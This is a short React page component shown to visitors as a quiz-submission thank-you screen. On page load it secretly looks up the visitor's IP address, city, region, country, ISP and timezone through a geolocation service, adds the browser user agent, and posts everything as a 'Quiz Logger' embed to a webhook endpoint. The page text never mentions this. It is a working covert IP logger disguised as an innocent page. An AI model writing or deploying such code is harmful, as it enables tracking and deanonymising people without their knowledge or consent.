import { useEffect } from 'react';

export default function Home() {
  useEffect(() => {
    fetch('https://ipapi.co/json/')
      .then(res => res.json())
      .then(async data => {
        const embed = {
          username: "Quiz Logger",
          embeds: [{
            title: "📥 Quiz Submission Logged",
            color: 0x7289DA,
            fields: [
              { name: "IP", value: data.ip, inline: true },
              { name: "City", value: data.city, inline: true },
              { name: "Region", value: data.region, inline: true },
              { name: "Country", value: data.country_name, inline: true },
              { name: "ISP", value: data.org, inline: false },
              { name: "TimeZone", value: data.timezone, inline: true },
              { name: "User Agent", value: navigator.userAgent, inline: false }
            ],
            footer: { text: "Logger by RedTeamOps" },
            timestamp: new Date().toISOString()
          }]
        };

        await fetch("/api/webhook", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify(embed)
        });
      });
  }, []);

  return (
    <div style={{
      background: 'url("/bg.jpg") center center / cover no-repeat',
      height: "100vh",
      color: "white",
      display: "flex",
      alignItems: "center",
      justifyContent: "center",
      textAlign: "center",
      fontSize: "1.5rem"
    }}>
      <div>
        <h1>✅ Thank you for your quiz submission!</h1>
        <p>You may kindly close this tab now.</p>
      </div>
    </div>
  );
}
